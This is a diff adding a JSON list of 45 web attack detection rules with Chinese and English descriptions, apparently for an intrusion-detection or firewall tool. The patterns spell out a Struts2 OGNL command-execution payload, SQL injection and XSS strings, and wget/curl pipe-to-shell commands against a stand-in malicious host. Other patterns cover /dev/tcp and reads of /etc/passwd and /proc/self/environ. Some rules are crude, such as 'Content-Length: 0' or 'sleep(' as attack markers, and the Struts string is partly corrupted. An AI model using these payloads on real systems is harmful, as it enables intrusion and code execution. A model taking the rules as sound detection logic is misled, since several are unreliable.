@@ -1,0 +1,320 @@
+{
+    "rules": [
+        {
+            "id": 1,
+            "pattern": ":${%23a%3dnew%20java.lang.ProcessBuilder(new%20java.lang.String[]{%22whoami%22}).start().getInputStream(),%23b%3dnew%http://20java.io.InputStreamReader(%23a),%23c%3dnew%http://20java.io.BufferedReader(%23b),%23d%3dnew%20char[51020],%23c.read(%23d),%23screen%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27).getWriter(),%23screen.println(%23d),%23screen.close()}%22%3Etest.action?redirect:${%23a%3dnew%20java.lang.ProcessBuilder(new%20java.lang.String[]{%22test%22}).start().getInputStream(),%23b%3dnew%http://20java.io.InputStreamReader(%23a),%23c%3dnew%20java",
+            "description": "Apache Struts2 rce ",
+            "severity": "serious",
+            "enabled": true
+        },
+        {
+            "id": 2,
+            "pattern": "-extractvalue(1,concat(0x5c,database()))-",
+            "description": "sql attack",
+            "severity": "medium",
+            "enabled": true
+        },
+        {
+            "id": 3,
+            "pattern": "/safety/ping.htm",
+            "description": "unauthorized access",
+            "severity": "low",
+            "enabled": true
+        },
+         {
+            "id": 4,
+            "pattern": "/admin/login?redirect=",
+            "description": "Unauthorized Access - 管理员登录重定向",
+            "severity": "medium",
+            "enabled": true
+        },
+        {
+            "id": 5,
+            "pattern": "<img src='javascript:alert(1)'>",
+            "description": "Cross-Site Scripting (XSS) - 图像注入",
+            "severity": "serious",
+            "enabled": true
+        },
+        {
+            "id": 6,
+            "pattern": "Content-Disposition: attachment; filename=",
+            "description": "信息泄露 - 文件下载",
+            "severity": "medium",
+            "enabled": true
+        },
+        {
+            "id": 7,
+            "pattern": "wget http://malicious.com/malware.sh -O- | sh",
+            "description": "命令注入 - 下载并执行恶意脚本",
+            "severity": "critical",
+            "enabled": true
+        },
+        {
+            "id": 8,
+            "pattern": "base64_decode(",
+            "description": "代码执行 - 解码并执行Base64编码的输入",
+            "severity": "serious",
+            "enabled": true
+        },
+        {
+            "id": 9,
+            "pattern": "curl -s http://malicious.com/install.sh | sh",
+            "description": "命令注入 - 使用cURL下载并执行脚本",
+            "severity": "critical",
+            "enabled": true
+        },
+        {
+            "id": 10,
+            "pattern": "<iframe src='http://malicious.com'></iframe>",
+            "description": "Cross-Site Scripting (XSS) - iframe注入",
+            "severity": "serious",
+            "enabled": true
+        },
+        {
+            "id": 11,
+            "pattern": "UNION SELECT username, password FROM users",
+            "description": "SQL Injection - 数据库合并查询",
+            "severity": "serious",
+            "enabled": true
+        },
+        {
+            "id": 12,
+            "pattern": "echo 'malicious code' | bash",
+            "description": "命令注入 - 执行恶意代码",
+            "severity": "critical",
+            "enabled": true
+        },
+        {
+            "id": 13,
+            "pattern": "../../etc/passwd",
+            "description": "目录遍历 - 读取系统文件",
+            "severity": "serious",
+            "enabled": true
+        },
+        {
+            "id": 14,
+            "pattern": "Content-Length: 0",
+            "description": "HTTP请求走私 - 内容长度不一致",
+            "severity": "serious",
+            "enabled": true
+        },
+        {
+            "id": 15,
+            "pattern": "Transfer-Encoding: chunked",
+            "description": "HTTP请求走私 - 块编码传输",
+            "severity": "serious",
+            "enabled": true
+        },
+        {
+            "id": 16,
+            "pattern": "Set-Cookie: .* HttpOnly",
+            "description": "会话劫持 - 窃取Cookie",
+            "severity": "serious",
+            "enabled": true
+        },
+        {
+            "id": 17,
+            "pattern": "<!--#exec cmd=\"/bin/sh\"-->",
+            "description": "命令注入 - 服务器端包含",
+            "severity": "critical",
+            "enabled": true
+        },
+        {
+            "id": 18,
+            "pattern": "' OR 1=1 --",
+            "description": "SQL Injection - 认证绕过",
+            "severity": "serious",
+            "enabled": true
+        },
+        {
+            "id": 19,
+            "pattern": "eval(",
+            "description": "代码执行 - eval函数调用",
+            "severity": "serious",
+            "enabled": true
+        },
+        {
+            "id": 20,
+            "pattern": "file://",
+            "description": "本地文件包含 (LFI)",
+            "severity": "serious",
+            "enabled": true
+        },
+        {
+            "id": 21,
+            "pattern": "php://input",
+            "description": "远程文件包含 (RFI) - 使用PHP输入流",
+            "severity": "critical",
+            "enabled": true
+        },
+        {
+            "id": 22,
+            "pattern": "<!--#include file=",
+            "description": "服务器端包含 (SSI) 注入",
+            "severity": "serious",
+            "enabled": true
+        },
+        {
+            "id": 23,
+            "pattern": "expect://",
+            "description": "命令执行 - 使用expect协议",
+            "severity": "critical",
+            "enabled": true
+        },
+        {
+            "id": 24,
+            "pattern": "User-Agent: .*sqlmap.*",
+            "description": "SQL注入工具探测 - sqlmap",
+            "severity": "serious",
+            "enabled": true
+        },
+        {
+            "id": 25,
+            "pattern": "/bin/bash -c",
+            "description": "命令注入 - 执行bash命令",
+            "severity": "critical",
+            "enabled": true
+        },
+        {
+            "id": 26,
+            "pattern": "/etc/hosts",
+            "description": "目录遍历 - 访问主机文件",
+            "severity": "serious",
+            "enabled": true
+        },
+        {
+            "id": 27,
+            "pattern": "OR 1=1",
+            "description": "SQL Injection - 条件语句始终为真",
+            "severity": "serious",
+            "enabled": true
+        },
+        {
+            "id": 28,
+            "pattern": "<iframe .*src=.*>",
+            "description": "跨站脚本攻击 (XSS) - iframe 注入",
+            "severity": "serious",
+            "enabled": true
+        },
+        {
+            "id": 29,
+            "pattern": "<body onload=.*>",
+            "description": "跨站脚本攻击 (XSS) - body onload事件注入",
+            "severity": "serious",
+            "enabled": true
+        },
+        {
+            "id": 30,
+            "pattern": "INSERT INTO .* VALUES (",
+            "description": "SQL Injection - 插入数据",
+            "severity": "medium",
+            "enabled": true
+        },
+        {
+            "id": 31,
+            "pattern": "/proc/self/environ",
+            "description": "本地文件包含 (LFI) - 环境变量访问",
+            "severity": "serious",
+            "enabled": true
+        },
+        {
+            "id": 32,
+            "pattern": "sleep(",
+            "description": "SQL Injection - 时间延迟注入",
+            "severity": "serious",
+            "enabled": true
+        },
+        {
+            "id": 33,
+            "pattern": "benchmark(",
+            "description": "SQL Injection - MySQL 基准测试函数注入",
+            "severity": "serious",
+            "enabled": true
+        },
+        {
+            "id": 34,
+            "pattern": "User-Agent: .*acunetix.*",
+            "description": "扫描探测 - Acunetix",
+            "severity": "medium",
+            "enabled": true
+        },
+        {
+            "id": 35,
+            "pattern": "cmd.exe /c",
+            "description": "命令注入 - Windows 命令执行",
+            "severity": "critical",
+            "enabled": true
+        },
+        {
+            "id": 36,
+            "pattern": "X-Original-URL: ",
+            "description": "HTTP Header 攻击 - 伪造 URL",
+            "severity": "medium",
+            "enabled": true
+        },
+        {
+            "id": 37,
+            "pattern": "Content-Type: multipart/form-data",
+            "description": "文件上传攻击",
+            "severity": "medium",
+            "enabled": true
+        },
+        {
+            "id": 38,
+            "pattern": "base64_encode(",
+            "description": "代码执行 - PHP Base64 编码",
+            "severity": "serious",
+            "enabled": true
+        },
+        {
+            "id": 39,
+            "pattern": "<object data=",
+            "description": "跨站脚本攻击 (XSS) - object 标签注入",
+            "severity": "serious",
+            "enabled": true
+        },
+        {
+            "id": 40,
+            "pattern": "Referer: .*evil.com",
+            "description": "CSRF - 恶意站点来源",
+            "severity": "medium",
+            "enabled": true
+        },
+        {
+            "id": 41,
+            "pattern": "Proxy-Authorization: Basic",
+            "description": "代理注入攻击",
+            "severity": "medium",
+            "enabled": true
+        },
+        {
+            "id": 42,
+            "pattern": "/dev/tcp/",
+            "description": "命令注入 - 使用 TCP 通信",
+            "severity": "critical",
+            "enabled": true
+        },
+        {
+            "id": 43,
+            "pattern": "php://filter/read=",
+            "description": "本地文件包含 (LFI) - 使用 PHP 过滤器",
+            "severity": "serious",
+            "enabled": true
+        },
+        {
+            "id": 44,
+            "pattern": "echo shell_exec(",
+            "description": "代码执行 - 执行 shell 命令",
+            "severity": "critical",
+            "enabled": true
+        },
+        {
+            "id": 45,
+            "pattern": "User-Agent: .*nmap.*",
+            "description": "扫描探测 - Nmap",
+            "severity": "medium",
+            "enabled": true
+        }
+
+    ]
+}
